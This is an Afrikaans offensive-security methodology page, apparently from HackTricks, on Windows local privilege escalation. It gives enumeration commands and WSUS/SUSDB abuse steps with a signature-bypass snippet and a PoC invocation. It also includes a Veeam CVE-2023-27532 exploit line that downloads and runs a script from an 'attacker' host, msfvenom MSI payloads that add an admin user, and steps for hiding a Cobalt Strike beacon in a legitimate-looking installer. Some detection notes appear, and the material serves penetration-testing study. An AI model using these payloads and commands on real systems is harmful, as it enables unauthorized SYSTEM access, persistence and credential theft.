# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Beste tool om Windows local privilege escalation-vektore te vind:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Hierdie bladsy konsolideer algemene Windows privilege-escalation-metodologie uit verskeie fundamentele gidse.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Die praktiese enumerasie-vloei put ook uit community-werkswinkels en kontrolelyste.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Die historiese aanvalmateriaal sluit die DerbyCon-aanbieding oor Windows privilege escalation in.<sup>[[5]](#references)</sup>

## Aanvanklike Windows-teorie

### Access Tokens

**As jy nie weet wat Windows access tokens is nie, lees die volgende bladsy voordat jy voortgaan:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Kyk na die volgende bladsy vir meer inligting oor ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**As jy nie weet wat integrity levels in Windows is nie, lees die volgende bladsy voordat jy voortgaan:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows-sekuriteitskontroles

Daar is verskillende dinge in Windows wat jou kan **verhoed om die stelsel te enumerate**, uitvoerbare lêers te laat loop of selfs **jou aktiwiteite op te spoor**. Jy moet die volgende **bladsy lees** en al hierdie **verdedigingsmeganismes** **enumerate** voordat jy met die privilege-escalation-enumerasie begin:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fisiese toegang kan ook ’n offline UEFI NVRAM-wysiging omskep in pre-boot DMA en ’n Windows `SYSTEM`-geheue-patching-ketting:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess-prosesse wat deur `RAiLaunchAdminProcess` geloods word, kan misbruik word om High IL sonder prompts te bereik wanneer AppInfo secure-path-kontroles omseil word. Kyk hier na die toegewyde UIAccess/Admin Protection bypass-werkvloei:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation kan misbruik word vir ’n arbitrêre SYSTEM registry write (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Onlangse Windows builds het ook ’n **SMB arbitrary-port** LPE-pad bekendgestel waar ’n bevoorregte plaaslike NTLM-authentication oor ’n hergebruikte SMB TCP-verbinding gereflekteer word:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Stelselinligting

### Weergawe-inligting-enumerasie

Kontroleer of die Windows-weergawe enige bekende vulnerability het (kontroleer ook die toegepaste patches).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Hierdie [site](https://msrc.microsoft.com/update-guide/vulnerability) is handig om gedetailleerde inligting oor Microsoft-sekuriteitskwesbaarhede op te soek. Hierdie databasis bevat meer as 4 700 sekuriteitskwesbaarhede, wat die **massiewe aanvaloppervlak** toon wat ’n Windows-omgewing bied.

**Op die stelsel**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas het watson ingebed)_

**Plaaslik met stelselinligting**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github-repos van exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Omgewing

Is enige credential/Juicy-inligting in die env-veranderlikes gestoor?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell-geskiedenis
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript-lêers

Jy kan leer hoe om dit aan te skakel by [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Besonderhede van PowerShell-pyplynuitvoerings word aangeteken, insluitend uitgevoerde opdragte, opdraginvokasies en dele van scripts. Volledige uitvoeringsbesonderhede en uitvoerresultate word egter moontlik nie vasgelê nie.

Om dit te aktiveer, volg die instruksies in die afdeling "Transcript files" van die dokumentasie, en kies **"Module Logging"** in plaas van **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Om die laaste 15 gebeurtenisse uit PowerShell-logboeke te sien, kan jy uitvoer:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

’n Volledige rekord van die aktiwiteit en inhoud van die script se uitvoering word vasgelê, wat verseker dat elke kodeblok gedokumenteer word terwyl dit uitgevoer word. Hierdie proses bewaar ’n omvattende ouditspoor van elke aktiwiteit, wat waardevol is vir forensiese ondersoeke en die ontleding van kwaadwillige gedrag. Deur alle aktiwiteit tydens uitvoering te dokumenteer, word gedetailleerde insigte in die proses verskaf.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Gebeurtenisse wat vir die Script Block aangeteken word, kan in die Windows Event Viewer gevind word by die pad: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Om die laaste 20 gebeurtenisse te sien, kan jy die volgende gebruik:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internetinstellings
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Aandrywers
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Jy kan die stelsel kompromitteer indien die updates nie met http**S** nie, maar met http aangevra word.

Jy begin deur te kontroleer of die netwerk ’n nie-SSL WSUS update gebruik deur die volgende in cmd uit te voer:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Of die volgende in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
As jy ’n antwoord soos een van hierdie kry:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
En as `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` of `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gelyk is aan `1`.

Dan, **is dit exploitable.** As die laaste registry gelyk is aan `0`, sal die WSUS-inskrywing geïgnoreer word.

Om hierdie vulnerabilities te exploit, kan jy tools soos [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) gebruik - Dit is MiTM weaponized exploit-scripts om 'fake' updates in nie-SSL WSUS-verkeer te inject.

Lees die research hier:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lees die volledige report hier**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Basies is dit die flaw wat hierdie bug exploit:

> As ons die vermoë het om ons plaaslike user proxy te modify, en Windows Updates die proxy gebruik wat in Internet Explorer se settings configured is, het ons dus die vermoë om [PyWSUS](https://github.com/GoSecure/pywsus) plaaslik te run om ons eie verkeer te intercept en code as 'n elevated user op ons asset te run.
>
> Verder, aangesien die WSUS-service die huidige user se settings gebruik, sal dit ook sy certificate store gebruik. As ons 'n self-signed certificate vir die WSUS-hostname generate en hierdie certificate by die huidige user se certificate store voeg, sal ons beide HTTP- en HTTPS-WSUS-verkeer kan intercept. WSUS gebruik geen HSTS-agtige mechanisms om 'n trust-on-first-use-tipe validation op die certificate te implementeer nie. As die aangebied certificate deur die user vertrou word en die korrekte hostname het, sal dit deur die service aanvaar word.

Jy kan hierdie vulnerability exploit deur die tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) te gebruik (sodra dit vrygestel is).

### SUSDB custom-update misbruik: unsigned payloads via `.txt`/`.esd`

Dit is 'n ander trust-boundary failure as die intercepting van 'n HTTP WSUS-verbinding: die prerequisite is voldoende toegang tot die **WSUS-databasis (`SUSDB`) stored procedures** om 'n custom update te publish en approve. Een praktiese entry path is om 'n upstream WSUS-computer account na 'n aparte MSSQL-server wat `SUSDB` host, te relay; die presiese prerequisite verskil volgens die deployment, so enumerate eers `EXECUTE`-permissions in plaas daarvan om SQL-administratorregte te aanvaar.<sup>[[38]](#references)[[39]](#references)</sup>

Vir die aparte attack path wat WSUS-client-authentication van HTTP/8530 na LDAP, SMB of AD CS relay, sien [Abusing WSUS HTTP for NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Bou, target en approve die update

Die custom-update-workflow gebruik legitieme WSUS-prosedures as 'n beperkte publishing API. Die belangrike state transitions is:<sup>[[38]](#references)</sup>

| Stage | Relevant stored procedures |
| --- | --- |
| Import update metadata | `spImportUpdate` |
| Store prerequisite, localized and extended XML fragments | `spSaveXMLFragment` |
| Associate the content digest with its attacker-controlled URL | `spSetBatchURL` |
| Enumerate/create a computer group and add the client | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Approve installation for that group | `spDeployUpdate` with `@actionID = 0` and `@isAssigned = 1` |

Die file name, digests, size en `CommandLineInstallation`-handler moet ooreenstem oor die imported metadata/fragments heen. Nadat die content URL en target group toegeken is, lyk die finale approval soos die volgende; gebruik nuwe update-, group- en deployment-identifiers eerder as om example GUIDs te hergebruik.<sup>[[38]](#references)[[39]](#references)</sup>
```sql
EXEC spDeployUpdate
@updateID = '<update-guid>', @revisionNumber = 1,
@actionID = 0, @targetGroupID = '<group-guid>',
@isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
@adminName = 'Administrator';
```
#### Extension-driven signature bypass

WSUS verwerp normaalweg arbitrêre ongetekende uitvoerbare inhoud. In `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` stel die .NET `VerifyFile`-pad egter sy sertifikaatkontrolevlag op false wanneer die verskafde lêernaam op `.txt` of `.esd` eindig; `CheckCertificateSignature` word dan oorgeslaan sonder om eers te bewys dat die grepe teks of ’n wettige ESD-image is. Daarom kan ’n onveranderde PE met byvoorbeeld die naam `payload.exe.txt` inhoudverifikasie slaag en later deur die update se command-line installasiehandler geloods word. Dit is ’n policy/type-confusion-fout, nie signature forgery nie.<sup>[[39]](#references)</sup>
```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
checkSignature = false;
if (checkSignature)
CheckCertificateSignature(/* downloaded file */);
```
#### BITS-versoenbare staging en outomatisering

Deur `spDeployUpdate` aan te roep, laat WSUS die geregistreerde inhoud haal. Die oorsprong moet aan BITS se HTTP-vereistes voldoen: ’n URL wat bereikbaar is, is alleen nie voldoende nie, omdat die oordrag ’n aanvanklike `HEAD`/`GET`-vloei en byte-range-versoeke gebruik. ’n Bediener sonder Range-ondersteuning veroorsaak WSUS-sinchronisasie-`EventId=364`, wat aandui dat BITS die Range-protokolkopskrif vereis.<sup>[[39]](#references)</sup>

Die navorsing-PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) genereer die SQL wat vir die import/fragment/URL/group/deployment-ketting benodig word, sluit ’n gewysigde MSSQL-kliënt in om dit uit te voer, en verskaf `BitsWebServer.py` vir inhoud-staging. ’n Minimale gemagtigde-laboratorium-aanroeping is:<sup>[[40]](#references)</sup>
```bash
python3 NotWSUSpicious.py \
--wsusHostname wsus.lab.local \
--updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
--updateName SecurityUpdate \
--updateFilePath /payloads/payload.exe.txt \
--updateArguments '' \
--computerGroup TestGroup \
--targetComputer workstation.lab.local
python3 BitsWebServer.py
```
#### Onbemande uitvoering en volharding deur herprobering

Kliëntkant-interaksie hang van beleid af. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opsie `4 - Auto download and schedule install`, laat 'n goedgekeurde opdatering aflaai en installeer volgens die gekonfigureerde skedule sonder dat die gebruiker dit handmatig kies. Tydens toetsing is 'n payload waarvan die opdatering misluk of onvolledig gebly het, onmiddellik weer aangebied nadat die callback-proses beëindig is, sodat herproberingsgedrag herhalende uitvoeringvolharding kan word; dit is opvallend omdat die kliënt 'n opdatering-mislukkingstoestand blootstel.<sup>[[39]](#references)</sup>

#### Opsporing- en hardening-skuifpunte

Nuttige server- en client-side-skuifpunte uit hierdie ketting is:<sup>[[39]](#references)</sup>

- Oudit `SUSDB` se uitvoering van `spCreateTargetGroup`, `spSetBatchURL` en `spDeployUpdate`; ondersoek nuwe targeting-groepe, eksterne content-origins, `.txt`/`.esd`-update-payloads en deployments wat deur onverwagte principals uitgevoer is (veral nie-rekeninge).
- Hersien `C:\Program Files\Update Services\LogFiles` vir `ContentSyncAgent`, `FileVerified`, die verkeerd gespelde `FileVerficationFailed`, en `EventId=364`; korreleer verifikasie met payload-uitbreiding en content magic eerder as om die suffix te vertrou.
- Soek na Windows Update-installasies wat herhaaldelik misluk/herprobeer, asook PE-uitvoering of onverwagte child/network-aktiwiteit vanaf content met `.txt`- of `.esd`-name.
- Vereis Extended Protection for Authentication op die database-diens waar dit ondersteun word, en beperk database-netwerktoegang tot die WSUS-server en gemagtigde administratiewe stelsels. Minimaliseer en oudit `EXECUTE`-regte op die custom-update-prosedures.

## Derdeparty Auto-Updaters en Agent IPC (local privesc)

Baie enterprise-agents stel 'n localhost IPC-oppervlak en 'n gepriviligeerde update-kanaal bloot. Indien enrollment na 'n aanvaller se server gedwing kan word en die updater 'n rogue root CA of swak signer checks vertrou, kan 'n local user 'n kwaadwillige MSI lewer wat die SYSTEM-diens installeer. Sien hier 'n veralgemeende tegniek (gebaseer op die Netskope stAgentSvc-ketting – CVE-2025-0309):


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` stel 'n localhost-diens op **TCP/9401** bloot wat aanvaller-beheerde boodskappe verwerk, wat arbitrêre opdragte as **NT AUTHORITY\SYSTEM** toelaat.<sup>[[12]](#references)</sup>

- **Recon**: bevestig die listener en weergawe, bv. `netstat -ano | findstr 9401` en `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: plaas 'n PoC soos `VeeamHax.exe` met die vereiste Veeam DLLs in dieselfde directory, en aktiveer dan 'n SYSTEM-payload oor die plaaslike socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Die diens voer die opdrag as SYSTEM uit.
## KrbRelayUp

’n **local privilege escalation**-kwesbaarheid bestaan in Windows-**domein**omgewings onder spesifieke toestande. Hierdie toestande sluit omgewings in waar LDAP signing nie afgedwing word nie, waar gebruikers oor self-regte beskik wat hulle toelaat om **Resource-Based Constrained Delegation (RBCD)** te konfigureer, en waar gebruikers rekenaars binne die domein kan skep. Dit is belangrik om daarop te let dat hierdie **vereistes** met behulp van **verstekinstellings** nagekom word.

Vind die **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Vir meer inligting oor die aanvalsvloei, kyk na [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**As** hierdie 2 registers **geaktiveer** is (waarde is **0x1**), kan gebruikers met enige privilege `*.msi`-lêers as NT AUTHORITY\\**SYSTEM** **installeer** (uitvoer).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```
As jy ’n meterpreter-sessie het, kan jy hierdie tegniek outomatiseer deur die module **`exploit/windows/local/always_install_elevated`** te gebruik.

### PowerUP

Gebruik die `Write-UserAddMSI`-opdrag van power-up om binne die huidige gids ’n Windows MSI-binêr te skep om privileges te eskaleer. Hierdie script skryf ’n voorafgecompileerde MSI-installeerder uit wat vra vir die byvoeging van ’n gebruiker/groep (dus sal jy GIU-toegang nodig hê):
```
Write-UserAddMSI
```
Voer bloot die geskepte binary uit om privileges te eskaleer.

### MSI Wrapper

Lees hierdie tutorial om te leer hoe om 'n MSI wrapper met hierdie tools te skep. Let daarop dat jy 'n "**.bat**"-lêer kan wrap as jy **slegs** **command lines** wil **uitvoer**.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Genereer** met Cobalt Strike of Metasploit 'n **nuwe Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Maak **Visual Studio** oop, kies **Create a new project** en tik "installer" in die soekkassie. Kies die **Setup Wizard**-projek en klik **Next**.
- Gee die projek 'n naam, soos **AlwaysPrivesc**, gebruik **`C:\privesc`** as die ligging, kies **place solution and project in the same directory**, en klik **Create**.
- Hou aan om **Next** te klik totdat jy by stap 3 van 4 kom (kies lêers om in te sluit). Klik **Add** en kies die Beacon payload wat jy pas gegenereer het. Klik dan **Finish**.
- Merk die **AlwaysPrivesc**-projek in die **Solution Explorer** en verander in die **Properties** **TargetPlatform** van **x86** na **x64**.
- Daar is ander properties wat jy kan verander, soos die **Author** en **Manufacturer**, wat die geïnstalleerde app meer legitiem kan laat lyk.
- Regsklik op die projek en kies **View > Custom Actions**.
- Regsklik op **Install** en kies **Add Custom Action**.
- Dubbelklik op **Application Folder**, kies jou **beacon.exe**-lêer en klik **OK**. Dit verseker dat die beacon payload uitgevoer word sodra die installer laat loop word.
- Verander onder die **Custom Action Properties** **Run64Bit** na **True**.
- Laastens, **build** dit.
- As die waarskuwing `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` vertoon word, maak seker dat jy die platform op x64 gestel het.

### MSI Installation

Om die **installasie** van die kwaadwillige `.msi`-lêer **in die agtergrond** uit te voer:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Om hierdie kwesbaarheid uit te buit, kan jy gebruik: _exploit/windows/local/always_install_elevated_

## Antivirus en Detektors

### Ouditinstellings

Hierdie instellings bepaal wat **aangeteken** word, dus moet jy daarop let
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, dit is interessant om te weet waarheen die logs gestuur word
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** is ontwerp vir die **bestuur van plaaslike Administrator-wagwoorde**, om te verseker dat elke wagwoord **uniek, ewekansig en gereeld opgedateer** is op rekenaars wat by 'n domain aangesluit is. Hierdie wagwoorde word veilig binne Active Directory gestoor en kan slegs verkry word deur gebruikers aan wie voldoende toestemmings deur ACLs toegeken is, sodat hulle plaaslike admin-wagwoorde kan sien indien hulle gemagtig is.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Wanneer dit aktief is, word **plaintext-wagwoorde in LSASS** (Local Security Authority Subsystem Service) gestoor.\
[**Meer inligting oor WDigest op hierdie bladsy**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Vanaf **Windows 8.1** het Microsoft verbeterde beskerming vir die Local Security Authority (LSA) ingestel om pogings deur onvertroude prosesse om **sy geheue te lees** of kode in te spuit, te **blokkeer**, wat die stelsel verder beveilig.\
[**Meer inligting oor LSA Protection hier**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credential Guard

**Credential Guard** is in **Windows 10** bekendgestel. Die doel daarvan is om geloofsbriewe wat op ’n toestel gestoor word, teen bedreigings soos pass-the-hash attacks te beskerm. [**Meer inligting oor Credential Guard is hier beskikbaar.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domeinbewyse** word deur die **Local Security Authority** (LSA) geverifieer en deur bedryfstelselkomponente gebruik. Wanneer 'n gebruiker se aanmelddata deur 'n geregistreerde sekuriteitspakket geverifieer word, word domeinbewyse vir die gebruiker tipies opgestel.\
[**Meer inligting oor Cached Credentials hier**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Gebruikers en Groepe

### Enumereer Gebruikers en Groepe

Jy moet nagaan of enige van die groepe waarvan jy lid is interessante toestemmings het
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Bevoorregte groepe

As jy **aan ’n bevoorregte groep behoort, kan jy moontlik voorregte eskaleer**. Leer hier meer oor bevoorregte groepe en hoe om hulle te misbruik om voorregte te eskaleer:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Tokenmanipulasie

**Leer meer** oor wat ’n **token** is op hierdie bladsy: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Gaan die volgende bladsy na om **meer oor interessante tokens te leer** en hoe om hulle te misbruik:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Aangemelde gebruikers / Sessies
```bash
qwinsta
klist sessions
```
### Tuisvouers
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Wagwoordbeleid
```bash
net accounts
```
### Kry die inhoud van die knipbord
```bash
powershell -command "Get-Clipboard"
```
## Lopende prosesse

### Lêer- en vouertoestemmings

Eerstens, wanneer jy die prosesse lys, **kyk vir wagwoorde binne die opdragreël van die proses**.\
Kyk of jy enige **lopende binary kan oorskryf** of skryftoestemmings op die binary-vouer het om moontlike [**DLL Hijacking attacks**](dll-hijacking/index.html) uit te buit:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Kontroleer altyd vir moontlike [**electron/cef/chromium debuggers** wat loop; jy kan dit misbruik om voorregte te verhoog](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

**Kontroleer toestemmings van die prosesse se binaries**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kontroleer die toestemmings van die vouers van die prosesse se binaries (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Jy kan ’n memory dump van ’n lopende proses skep met **procdump** van Sysinternals. Dienste soos FTP het die **aanmeldbewyse in gewone teks in die geheue**; probeer om die geheue te dump en die aanmeldbewyse te lees.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Onveilige GUI-toepassings

**Toepassings wat as SYSTEM loop, kan ’n gebruiker toelaat om ’n CMD te begin of deur gidse te blaai.**

Voorbeeld: "Windows Help and Support" (Windows + F1), soek vir "command prompt", klik op "Click to open Command Prompt"

## Dienste

Service Triggers laat Windows toe om ’n diens te begin wanneer sekere toestande voorkom (named pipe/RPC endpoint-aktiwiteit, ETW-gebeurtenisse, IP-beskikbaarheid, toestel-aankoms, GPO-verversing, ens.). Selfs sonder SERVICE_START-regte kan jy dikwels bevoorregte dienste begin deur hul triggers te aktiveer. Sien enumerasie- en aktiveringstegnieke hier:

-
{{#ref}}
service-triggers.md
{{#endref}}

Kry ’n lys van dienste:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Toestemmings

Jy kan **sc** gebruik om inligting oor 'n diens te kry
```bash
sc qc <service_name>
```
Dit word aanbeveel om die binêre **accesschk** van _Sysinternals_ te hê om die vereiste privilegievlak vir elke diens na te gaan.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Dit word aanbeveel om te kontroleer of "Authenticated Users" enige diens kan wysig:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP from here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Aktiveer diens

As jy hierdie fout kry (byvoorbeeld met SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Jy kan dit aktiveer deur gebruik te maak van
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Neem in ag dat die diens upnphost van SSDPSRV afhanklik is om te werk (vir XP SP1)**

**Nog 'n workaround** vir hierdie probleem is om die volgende uit te voer:
```
